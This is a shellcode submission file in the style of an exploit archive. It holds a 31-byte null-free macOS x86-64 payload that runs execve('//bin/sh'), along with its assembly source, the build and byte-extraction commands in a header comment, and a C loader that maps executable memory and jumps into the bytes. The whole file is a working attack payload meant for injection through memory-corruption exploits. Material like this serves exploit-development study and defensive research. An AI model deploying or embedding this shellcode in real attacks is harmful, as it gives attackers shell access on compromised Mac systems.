/*
# Title:  macOS - execve(/bin/sh) + Null-Free Shellcode (31 bytes)
# Date:   2019-02-17
# Tested: macOS 10.14.1
# Author: Ken Kitahara
# Compilation: gcc -o loader loader.c

dev:works devuser$ sw_vers
ProductName:	Mac OS X
ProductVersion:	10.14.1
BuildVersion:	18B75
dev:works devuser$ cat binsh.s
section .text
global start
start:
    ; execve("//bin/sh", 0, 0)
    xor  rax, rax
    cdq
    push rax
    mov  rdi, 0x68732f6e69622f2f
    push rdi
    push rsp
    pop  rdi
    xor  rsi, rsi
    mov  al, 0x2
    ror  rax, 0x28
    mov  al, 0x3b
    syscall
dev:works devuser$ nasm -f macho64 -o binsh.o binsh.s && ld -macosx_version_min 10.7.0 -o binsh binsh.o
dev:works devuser$ for i in $(objdump -d ./binsh.o | grep "^ " | cut -f2); do echo -n '\x'$i; done; echo
\x48\x31\xc0\x99\x50\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x54\x5f\x48\x31\xf6\xb0\x02\x48\xc1\xc8\x28\xb0\x3b\x0f\x05
dev:works devuser$
*/

#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] =
"\x48\x31\xc0\x99\x50\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x54\x5f\x48\x31\xf6\xb0\x02\x48\xc1\xc8\x28\xb0\x3b\x0f\x05";

int main(int argc, char **argv) {
    printf("Shellcode Length: %zd Bytes\n", strlen(shellcode));

    void *ptr = mmap(0, 0x22, PROT_EXEC | PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE, -1, 0);

    if (ptr == MAP_FAILED) {
        perror("mmap");
        exit(-1);
    }

    memcpy(ptr, shellcode, sizeof(shellcode));
    sc = ptr;

    sc();

    return 0;
}